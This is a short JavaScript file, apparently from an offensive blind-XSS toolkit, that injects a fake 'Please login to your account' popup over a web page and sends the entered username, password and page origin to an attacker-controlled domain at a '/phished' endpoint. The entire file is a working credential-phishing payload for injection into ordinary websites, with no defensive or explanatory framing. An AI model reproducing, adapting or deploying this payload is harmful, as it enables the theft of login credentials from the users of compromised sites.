/**

:::      .::.:::.  .-:.     ::- :::.           .,-:::::  ::: ,::::::  .,-:::::/      ...         :::.    :::. ,::::::  :.    :::.
';;,   ,;;;' ;;`;;  ';;.   ;;;; ;;`;;        ,;;;'````'  ;;; ;;;'''',;;-'````'    .;;;;;;;.      `;;;;,  `;;; ;;;''''  ;;;,  `;;;
 \[[  .[[/  ,[[ '[[,  '[[,[[[' ,[[ '[[,      [[[         [[[ [[cccc [[[   [[[[[[/ [[     \[[,      [[[[[. '[[ [[cccc   [[[[[. '[[
  Y$c.$$$   $$$cc$$$c   c$$$   $$$cc$$$c     $$$         $$$ $$$$$$ $$$c.    $$$  $$,     $$$      $$$ $Y$c$$ $$$$$$   $$$ $Y$c$$
   Y88P     888   888 ,8P$`    888   888,    `88bo,__,o, 888 88u_    `Y8bo,,,o88o 888,_ _,88P      888    Y88 888u_    888    Y88
    MP      YMM   $$` M$       YMM   $$`       $YUMMMMMP MMM $$$$YUM   `'YMUP$YM    YMMMMMP$       MMM     YM $$$$YUMM MMM     YM

https://github.com/hipotermia/vaya-ciego-nen
@_hipotermia_

**/

function go_login(domain){
	var user = document.getElementById("7878user").value;
	var pass = document.getElementById("7878pass").value;

	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			document.getElementById("7878back").style.display = "none";
			document.getElementById("7878popup").style.display = "none";
			document.cookie = "7878login=True";
		}
	}
	xhttp.open("POST", "https://" + domain + "/phished", true);
	xhttp.setRequestHeader("Content-type", "application/json");
	xhttp.send(JSON.stringify({ user: user, pass: pass, url: location.origin }));
}

function go_phish(domain){
	if (document.cookie.indexOf("7878login=True") === -1){
		document.body.innerHTML += '<div id="7878back" style="position:fixed;top:0;background:#000;width:100%;height:100%;opacity:0.5;z-index:9998;"></div>'
		document.body.innerHTML += '<div id="7878popup" style="position:fixed;min-height:200px;width:450px;top:50%;left:50%;transform: translate(-50%,-60%);background:#fff;z-index:9999;border-radius:5px;padding:15px;"><p>Please login to your account:</p><form action="javascript:go_login(\'' + domain + '\')"><b>Username</b><br><input id="7878user" type="text" placeholder="Enter Username"><br><br><b>Password</b><br><input id="7878pass" type="password" placeholder="Enter Password"><br><div align="right"><button type="submit">Go</button></div></form></div>';
	}
}

